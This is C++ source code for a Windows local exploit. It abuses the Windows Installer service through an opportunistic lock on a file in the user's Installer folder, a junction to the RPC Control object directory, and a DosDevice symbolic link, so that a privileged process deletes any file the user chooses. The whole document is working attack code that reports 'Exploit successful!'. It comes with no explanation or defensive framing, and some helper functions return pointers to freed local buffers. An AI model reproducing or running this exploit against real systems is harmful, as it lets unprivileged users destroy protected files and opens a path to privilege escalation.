#include "def.h"
#include "FileOpLock.h"
int wmain(int argc, wchar_t** argv) {

    if (argc < 2) {
        printf("[*] Usage: %ls <path to file to delete>\n", argv[0]);
        return 1;
    }
	install(TRUE);
    	Sleep(500);
	std::wstring dir = L"C:\\users\\";
	WCHAR user[MAX_PATH] = {0x0};
	DWORD cbUser = MAX_PATH;
	GetUserName(user, &cbUser);
	dir = dir + std::wstring(user) + L"\\AppData\\Roaming\\Microsoft\\Installer";
	MoveFileEx(dir.c_str(),RandomTmp(), MOVEFILE_REPLACE_EXISTING);
	CreateDirectory(dir.c_str(), NULL);
	dir = dir + L"\\{31566FE1-6713-4FC2-A132-EB4C9D111012}";
	CreateDirectory(dir.c_str(), NULL);
	std::wstring file = dir + L"\\icon.ico";
    DosDeviceSymLink(L"Global\\GLOBALROOT\\RPC Control\\icon.ico", BuildPath(argv[1]));

	hDir = CreateFile(dir.c_str(), FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	hFile = CreateFile(file.c_str(), DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
    FileOpLock* op;
    op = FileOpLock::CreateLock(hFile, cb0);
    if (op != NULL) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)install, NULL, 0, NULL);
        op->WaitForLock(INFINITE);
    }
    HANDLE success;

    do {
        Sleep(1000);
        success = CreateFile(argv[1], GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
    } while (success != INVALID_HANDLE_VALUE);
    printf("[+] Exploit successful!\n");
}
DWORD WINAPI install(BOOL install) {
	HMODULE hm = GetModuleHandle(NULL);
	HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_MSI2), L"msi");
	wchar_t msipackage[MAX_PATH] = { 0x0 };
	GetTempFileName(L"C:\\windows\\temp\\", L"MSI", 0, msipackage);
	printf("[*] MSI file: %ls\n", msipackage);
	DWORD MsiSize = SizeofResource(hm, res);
	void* MsiBuff = LoadResource(hm, res);
	HANDLE pkg = CreateFile(msipackage, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(pkg, MsiBuff, MsiSize, NULL, NULL);
	CloseHandle(pkg);
	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
	if (install) {
		MsiInstallProduct(msipackage, L"ACTION=INSTALL");
	}
	else {
		MsiInstallProduct(msipackage, L"REMOVE=ALL");
	}
		
	DeleteFile(msipackage);
	return 0;
}
LPCWSTR RandomTmp() {
	std::wstring tmp = L"\\??\\C:\\windows\\temp\\";
	RPC_WSTR str_uuid;
	UUID uuid = { 0 };
	UuidCreate(&uuid);
	UuidToString(&uuid, &str_uuid);
	tmp = tmp + std::wstring((WCHAR*)str_uuid);
	return tmp.c_str();
}
BOOL CreateJunction(HANDLE hDir, LPCWSTR target) {
    DWORD cb;
    wchar_t printname[] = L"";
    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
    SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
    SIZE_T PathLen = TargetLen + PrintnameLen + 12;
    SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
    PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
    Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Data->ReparseDataLength = PathLen;
    Data->Reserved = 0;
    Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
    {

        GetFinalPathNameByHandle(hDir, dir, MAX_PATH, 0);
        printf("[+] Junction %ls -> %ls created!\n", dir, target);
        free(Data);
        return TRUE;

    }
    else
    {

        printf("[!] Error: %d. Exiting\n", GetLastError());
        free(Data);
        return FALSE;
    }
}





BOOL DeleteJunction(HANDLE handle) {
    REPARSE_GUID_DATA_BUFFER buffer = { 0 };
    BOOL ret;
    buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DWORD cb = 0;
    IO_STATUS_BLOCK io;
    if (handle == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(handle, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL)) {
        GetFinalPathNameByHandle(handle, dir, MAX_PATH, 0);
        printf("[+] Junction %ls deleted!\n", dir);
        return TRUE;
    }
    else
    {
        printf("[!] Error: %d.\n", GetLastError());
        return FALSE;
    }
}

BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
        printf("[+] Symlink %ls -> %ls created!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("[!] Error :%d\n", GetLastError());
        return FALSE;

    }
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
        printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("[!] Error :%d\n", GetLastError());
        return FALSE;


    }
}
BOOL Move(HANDLE hFile) {
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Invalid handle!\n");
        return FALSE;
    }
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll != NULL) {

        pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");
    }
    if (pNtSetInformationFile == NULL) {
        printf("Cannot load api %d\n", GetLastError());
        exit(0);
    }
    LPCWSTR tmpfile = RandomTmp();
    size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
    FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
    IO_STATUS_BLOCK io = { 0 };
    rename_info->ReplaceIfExists = TRUE;
    rename_info->RootDirectory = NULL;
    rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
    rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
    memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
    NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
    if (status != 0) {
        return FALSE;
    }
    return TRUE;
}
void cb0() {
    printf("[*] Oplock trigger!\n");
    while (!Move(hFile)) {}
    CreateJunction(hDir, L"\\RPC Control");
}
LPWSTR  BuildPath(LPCWSTR path) {
    wchar_t ntpath[MAX_PATH];
    swprintf(ntpath, L"\\??\\%s", path);
    return ntpath;
}